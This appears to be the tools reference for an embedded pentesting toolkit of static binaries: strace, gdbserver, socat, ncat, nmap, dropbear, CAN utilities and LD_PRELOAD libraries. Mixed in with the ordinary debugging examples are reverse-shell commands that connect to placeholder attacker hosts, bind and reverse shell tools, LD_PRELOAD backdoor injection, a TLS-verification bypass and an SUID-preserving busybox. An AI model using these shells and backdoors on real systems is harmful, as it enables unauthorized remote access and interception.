# Tools Reference

Complete reference for all tools available in Sthenos Embedded Toolkit.

## Musl Static Tools

All tools are statically linked with musl libc and have zero runtime dependencies.

### Core Debugging Tools

#### strace
**System call tracer** - Monitor system calls made by programs.

```bash
./build strace --arch arm32v7le
./output/arm32v7le/strace ls -la
```

**Use cases**: Debugging, reverse engineering, security analysis

#### gdbserver  
**Remote debugging server** - Debug programs remotely with GDB.

```bash
./build gdbserver --arch aarch64
# On target: ./gdbserver :1234 /path/to/program
# On host: gdb -ex "target remote target:1234"
```

#### ply
**BPF-based dynamic tracer** - Lightweight eBPF/kprobes tracing.

```bash  
./build ply --arch x86_64
./output/x86_64/ply 'kprobe:sys_open { printf("open: %s\n", str(arg1)); }'
```

**Note**: Only supports little-endian architectures (x86_64, aarch64, arm32v7le, mips32le, riscv64, ppc64le)

### Network Tools

#### socat
**Socket relay tool** - Swiss army knife for network connections.

```bash
./build socat --arch mips32le  
# Port forwarding
./output/mips32le/socat TCP-LISTEN:8080,fork TCP:target:80
# Reverse shell
./output/mips32le/socat TCP:attacker:4444 EXEC:/bin/sh
```

#### ncat / ncat-ssl
**Network utility** - Netcat replacement with SSL support.

```bash
./build ncat --arch arm32v5le
./build ncat-ssl --arch arm32v5le  # With SSL support

# Simple reverse shell
./output/arm32v5le/ncat attacker_ip 4444 -e /bin/sh
```

#### tcpdump
**Network packet analyzer** - Capture and analyze network traffic.

```bash
./build tcpdump --arch powerpcle
./output/powerpcle/tcpdump -i eth0 host target_ip
```

#### nmap
**Network exploration tool** - Port scanning and network discovery.

```bash
./build nmap --arch aarch64
./output/aarch64/nmap -sS target_network/24
```

#### curl / curl-full
**HTTP/HTTPS client** - Command-line tool for transferring data with URLs.

```bash
./build curl --arch x86_64        # Basic curl with HTTP/HTTPS
./build curl-full --arch x86_64   # Full features including protocols like FTP, LDAP, etc.

# Basic usage
./output/x86_64/curl https://example.com
./output/x86_64/curl -X POST -d "data" https://api.example.com
```

**curl** - Minimal build with HTTP/HTTPS support
**curl-full** - Full-featured build with additional protocols

#### microsocks
**Lightweight SOCKS5 proxy** - Minimal SOCKS5 proxy server implementation.

```bash
./build microsocks --arch arm32v7le

# Run SOCKS5 proxy on port 1080
./output/arm32v7le/microsocks -p 1080

# With authentication
./output/arm32v7le/microsocks -u username -P password -p 1080
```

**Use cases**: Tunneling, network pivoting, bypassing network restrictions

### System Tools

#### busybox / busybox_nodrop
**Multi-call binary** - Over 300 Unix utilities in one binary.

```bash
./build busybox --arch mips32be
./output/mips32be/busybox ls -la
./output/mips32be/busybox --install -s /tmp/bin/  # Install applets
```

**busybox_nodrop** - Special variant that maintains SUID privileges when run as SUID root.

#### bash
**Bourne Again Shell** - Full-featured shell with scripting support.

```bash
./build bash --arch or1k
./output/or1k/bash --version
```

### SSH Tools (Dropbear)

#### dropbear / dbclient / scp / dropbearkey
**Lightweight SSH implementation** - SSH server, client, and utilities.

```bash
./build dropbear --arch armv6

# SSH server
./output/armv6/dropbear -F -E -p 22

# SSH client  
./output/armv6/dbclient user@host

# File transfer
./output/armv6/scp file user@host:/path/

# Key generation
./output/armv6/dropbearkey -t rsa -f host_key -s 2048
```

### CAN Bus Tools

#### can-utils
**CAN bus utilities** - 20+ tools for CAN bus analysis and debugging.

```bash
./build can-utils --arch arm32v7le
ls output/arm32v7le/can-utils/
```

**Key tools included**:
- **candump** - Display CAN frames  
- **cansend** - Send CAN frames
- **canplayer** - Replay CAN logs
- **isotpdump** - ISO-TP protocol analysis
- **j1939cat/j1939spy** - J1939 protocol tools

### Shell Utilities

#### shell-static
**Static shell tools** - Standalone executable versions of shell utilities.

```bash
./build shell-static --arch x86_64
ls output/x86_64/shell/
```

**Included tools**:
- **shell-bind** - Bind shell on port
- **shell-env** - Execute commands from EXEC_CMD env var
- **shell-helper** - Execute /dev/shm/helper.sh script  
- **shell-reverse** - Reverse shell
- **shell-fifo** - Named pipe shell
- **shell-loader** - Dynamic shell loader

### Custom Tools

#### custom / custom-glibc
**Example custom tool** - Template for adding your own C programs.

```bash
./build custom --arch riscv64
./build custom-glibc --arch x86_64  # glibc version
./output/riscv64/custom
```

**Important**: The `custom` tool is also the best way to test architecture compatibility. If `custom` runs and displays its banner, other tools for that architecture should work. If `custom` crashes with "Illegal instruction", you need a different architecture variant.

## Glibc Static Tools

Built with glibc for compatibility with glibc-based systems.

#### ltrace
**Library call tracer** - Trace dynamic library calls and signals.

```bash
./build ltrace --arch x86_64
./output/x86_64/ltrace /bin/ls
```

**Note**: Requires glibc runtime environment.

## LD_PRELOAD Libraries

Shared libraries for runtime interception and modification.

### Security/Testing Libraries

#### libdesock
**Socket redirection library** - Redirect network I/O to stdin/stdout for fuzzing.

```bash
./build libdesock --arch x86_64
LD_PRELOAD=./output-preload/glibc/x86_64/libdesock.so ./network_app
```

#### tls-noverify  
**TLS verification bypass** - Disable SSL/TLS certificate verification.

```bash
./build tls-noverify --arch aarch64
LD_PRELOAD=./output-preload/glibc/aarch64/libtlsnoverify.so curl https://expired.badssl.com/
```

### Shell Libraries

#### shell-bind / shell-env / shell-helper / shell-reverse / shell-fifo
**Runtime shell injection** - LD_PRELOAD libraries for backdoors and shells.

```bash
./build shell-bind --arch arm32v7le

# Bind shell on port 1337
SHELL_BIND_PORT=1337 LD_PRELOAD=./output-preload/glibc/arm32v7le/shell-bind.so ./target_app

# Execute from environment variable
EXEC_CMD="id" LD_PRELOAD=./output-preload/glibc/arm32v7le/shell-env.so ./target_app
```

## Build Options

### Standard Build
```bash
./build                           # All tools, all architectures
./build strace                    # strace for all architectures  
./build --arch arm32v7le          # All tools for arm32v7le
./build strace --arch x86_64      # strace for x86_64
```

### Debug Build
```bash  
./build -d strace --arch x86_64   # Verbose build output
```

### Architecture Detection
```bash
# Detect target architecture
arch=$(uname -m)
libc=$(ldd --version 2>&1|grep -qi musl && echo musl || echo glibc)  
echo "Detected: $arch/$libc"
```